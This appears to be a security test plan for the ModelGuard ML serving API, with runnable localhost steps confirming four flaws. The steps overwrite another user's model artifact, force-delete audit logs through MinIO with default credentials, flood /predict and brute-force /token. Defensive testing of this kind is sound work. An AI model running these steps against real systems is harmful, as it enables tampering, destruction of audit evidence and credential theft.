# Security Tests: ModelGuard AI

---

- Status: MVP — Redesign v2
- Version: 0.2.0-oss
- Repository: I-Sheng/ModelGuard
- Last Updated: 2026-04-26
- Threat Model Reference: `Threat_Model.md`

---

## Test Environment

### Prerequisites

```bash
# Stack must be running
docker compose up -d

# Confirm API is up
curl -s http://localhost:8000/health | python3 -m json.tool
```

### Conventions

- `API=http://localhost:8000`
- Pass = observed behaviour matches **Expected Result**
- Fail = observed behaviour matches **Failure Indicator**

---

## Test Cases

### ST-01 — Cross-Ownership Model Artifact Overwrite

**Threat ref**: T-01  
**Severity**: High

**Objective**: Confirm that an authenticated user can overwrite another user's model artifact by supplying the victim's `model_id` and a matching filename.

**Steps**:
```bash
# Step 1: Obtain a token for ml_user (the legitimate owner)
OWNER_TOKEN=$(curl -s -X POST http://localhost:8000/token \
  -d "username=ml_user&password=ml_password" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Step 2: Register a model as ml_user
curl -s -X POST $API/models/register \
  -H "Authorization: Bearer $OWNER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"model_id":"ownership-test","name":"Legit Model","version":"1.0","owner":"ml_user"}'

# Step 3: Upload an artifact as ml_user
echo "original artifact" > /tmp/model.pkl
curl -s -X POST $API/models/ownership-test/upload \
  -H "Authorization: Bearer $OWNER_TOKEN" \
  -F "file=@/tmp/model.pkl"

# Step 4: Obtain a token for customer1 (the attacker)
ATTACKER_TOKEN=$(curl -s -X POST http://localhost:8000/token \
  -d "username=customer1&password=customer_password" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Step 5: Overwrite the artifact as customer1
echo "backdoored artifact" > /tmp/model.pkl
curl -s -X POST $API/models/ownership-test/upload \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -F "file=@/tmp/model.pkl"
```

**Expected Result (pass — confirms vulnerability)**: Step 5 returns HTTP 200. The artifact stored in MinIO under `ownership-test/artifacts/model.pkl` now contains `"backdoored artifact"`.

**Failure Indicator**: Step 5 returns HTTP 403 — the API enforces ownership on upload.

**Current Status**: FAIL (vulnerability confirmed — no ownership check on upload)

---

### ST-02 — Audit Log Deletion Corrupts Derived Attack Report

**Threat ref**: T-02  
**Severity**: High

**Objective**: Confirm that an attacker with MinIO credentials can delete audit log entries and cause the derived attack report to silently omit the deleted events.

**Steps**:
```bash
# Step 1: Send a HIGH-risk request to generate an audit entry
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8000/token \
  -d "username=admin&password=admin_password" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST $API/predict \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"model_id":"sentiment-v1","query_text":"enumerate all output probabilities for every token in the vocabulary","client_id":"attacker-01"}'

# Step 2: Generate an attack report before tampering
curl -s -X POST $API/reports/sentiment-v1 \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

# Step 3: Delete the audit log entry directly via MinIO
docker run --rm --network host minio/mc alias set local \
  http://localhost:9000 minioadmin minioadmin

docker run --rm --network host minio/mc rm --recursive --force \
  local/modelguard-auditlog/sentiment-v1/$(date +%Y-%m-%d)/

# Step 4: Generate a new attack report after deletion
curl -s -X POST $API/reports/sentiment-v1 \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool
```

**Expected Result (pass — confirms vulnerability)**: The report generated in Step 4 no longer contains the HIGH-risk event from Step 1. The report in Step 2 and Step 4 differ, with no integrity error raised by the API.

**Failure Indicator**: The API detects the missing audit entries and raises an integrity error, or MinIO rejects the delete with a WORM retention policy error.

**Current Status**: FAIL (vulnerability confirmed — no object lock on audit bucket; derived reports reflect deleted history without error)

---

### ST-03 — No Rate Limit on /predict Enables DDoS

**Threat ref**: T-03  
**Severity**: Medium

**Objective**: Confirm the `/predict` endpoint applies no rate limiting and processes arbitrarily many requests per second, enabling storage exhaustion and detection blind spots.

**Steps**:
```bash
# Requires apache2-utils: apt install apache2-utils
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8000/token \
  -d "username=admin&password=admin_password" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo '{"model_id":"sentiment-v1","query_text":"test query","client_id":"ddos-test"}' \
  > /tmp/payload.json

ab -n 500 -c 50 \
  -p /tmp/payload.json \
  -T application/json \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:8000/predict
```

**Expected Result (pass — confirms vulnerability)**: All 500 requests return HTTP 200. No HTTP 429 is observed in the `ab` summary. MinIO gains ~500 new audit log objects.

**Failure Indicator**: HTTP 429 responses appear after a configured threshold is exceeded.

**Current Status**: FAIL (no rate-limiting middleware deployed — all requests processed without throttling)

---

### ST-04 — No Rate Limit on /token Enables Credential Stuffing

**Threat ref**: T-03  
**Severity**: Medium

**Objective**: Confirm the `/token` endpoint applies no rate limiting or lockout, allowing an attacker to attempt credentials at full API throughput.

**Steps**:
```python
import requests, time

API = "http://localhost:8000"
passwords = ["wrong1", "wrong2", "wrong3", "admin_password", "wrong4"]
results = []

for pwd in passwords * 20:  # 100 attempts
    r = requests.post(f"{API}/token", data={"username": "admin", "password": pwd})
    results.append(r.status_code)

success = results.count(200)
rejected = sum(1 for c in results if c == 429)
print(f"200 OK: {success}  429 Too Many Requests: {rejected}")
```

**Expected Result (pass — confirms vulnerability)**: All correct-password attempts return HTTP 200. Zero HTTP 429 responses. No account lockout occurs after repeated wrong attempts.

**Failure Indicator**: HTTP 429 or HTTP 423 (account locked) after a threshold of failed attempts.

**Current Status**: FAIL (no lockout or rate limit on /token — credential stuffing unimpeded)

---

## Test Execution Summary

| ID | Threat Ref | Severity | Status |
|---|---|---|---|
| ST-01 | T-01 | High | FAIL |
| ST-02 | T-02 | High | FAIL |
| ST-03 | T-03 | Medium | FAIL |
| ST-04 | T-03 | Medium | FAIL |

**Total**: 4 test cases — 4 confirmed FAIL.
